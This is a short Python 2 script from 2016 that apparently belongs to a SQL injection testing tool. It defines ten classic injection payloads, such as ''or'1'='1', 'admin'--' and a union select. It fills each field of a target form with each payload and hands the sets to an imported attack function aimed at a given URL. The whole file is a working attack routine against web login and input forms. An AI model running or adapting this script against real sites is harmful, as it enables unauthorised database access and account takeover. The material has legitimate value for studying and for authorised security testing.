# -*- coding: utf-8 -*-

'''
Created on 2016. 7. 26.

@author: JongHyuk
'''
from sqli import sqli_attack

def req_url(real_url,test2):
    sqli_pattern={'pattern1':"'or'1'='1",'pattern2':"'or'1'='2",'pattern3':"' or 1=1-- ",
                  'pattern4':"' or 1=1#",'pattern5':"admin' #",
                  'pattern6':"'union select 1  limit 1, 1%23",
                  'pattern7':"'",'pattern8':"a' or 1=1 --",'pattern9':"')or(x'='x",
                  'pattern10':"admin'--"}
    

    plist=[]
    payload={}
    res = []
    
    for p in sqli_pattern.keys(): #sql 패턴의 키 값을 추출 
        plist.append(p) #추출한 키 값을 순서대로 삽입
        #print "plist"
        #print plist #추출한 키값을 리스트로 저장 
    for pattern in plist:
        payload={}
        
        for tagId in test2:
            #payload={tagId:sqli_pattern.get(pattern)}
            print tagId,sqli_pattern.get(pattern)
            #if tagId!=payload[tagId]:
            payload[tagId]=sqli_pattern.get(pattern)
        res.append(payload)
    print res    
     
    sqli_attack(real_url, res)
